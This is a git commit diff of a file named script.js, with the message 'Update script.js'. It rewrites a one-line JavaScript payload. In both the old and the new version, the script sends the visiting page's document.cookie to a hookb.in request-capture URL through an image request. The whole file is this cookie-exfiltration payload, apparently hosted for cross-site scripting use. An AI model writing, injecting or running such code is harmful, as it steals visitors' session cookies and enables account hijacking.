34876a6224c5afe32c17a5420ba331818c17b6ba
sj1525 <66286507+sj1525@users.noreply.github.com>
2021-02-06 00:58:21 -0800

    Update script.js

--- script.js
+++ script.js
@@ -1,2 +1,2 @@
-var img = new Image(0,0); img.src='https://hookb.in/XkRM6gdBr7cGBBm3J00J?cooki=' + document.cookie
-document.body.appendChild(img);
+new Image().src='https://hookb.in/XkRM6gdBr7cGBBm3J00J?cooki=' + document.cookie
+
